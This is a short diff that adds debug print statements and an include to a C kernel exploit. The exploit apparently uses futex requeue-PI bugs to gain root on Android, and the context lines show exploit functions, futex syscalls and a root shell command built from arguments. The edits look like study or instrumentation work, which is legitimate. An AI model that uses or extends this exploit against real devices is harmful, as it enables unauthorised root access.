@@ -11,6 +11,8 @@
 #include <fcntl.h>
 //179change added to check syscall error
 #include <errno.h>
+//179change added to use sleep syscall
+#include <unistd.h>
 
 #define FUTEX_WAIT_REQUEUE_PI   11
 #define FUTEX_CMP_REQUEUE_PI    12
@@ -570,7 +572,9 @@ void *search_goodnum(void *arg) {
 	unsigned long addr, setaddr;
 	int i;
 	char buf[0x1000];
-
+    
+    //179change print 
+    printf("futex_lock_pi \n");
 	syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
 
 	while (1) {
@@ -811,7 +815,7 @@ void init_exploit() {
 			sleep(10);
 		}
 	}
-
+    
 	pthread_mutex_lock(&done_lock);
 	pthread_create(&th2, NULL, search_goodnum, NULL);
 	pthread_create(&th3, NULL, send_magicmsg, NULL);
@@ -824,6 +828,9 @@ int main(int argc, char **argv) {
 	if (argc >= 2) {
 		snprintf(rootcmd, sizeof(rootcmd) - 1, "/system/bin/sh -c '%s'", argv[1]);
 	}
+    
+    //179change print 
+    printf("init_exploit() \n");
 
 	init_exploit();
 
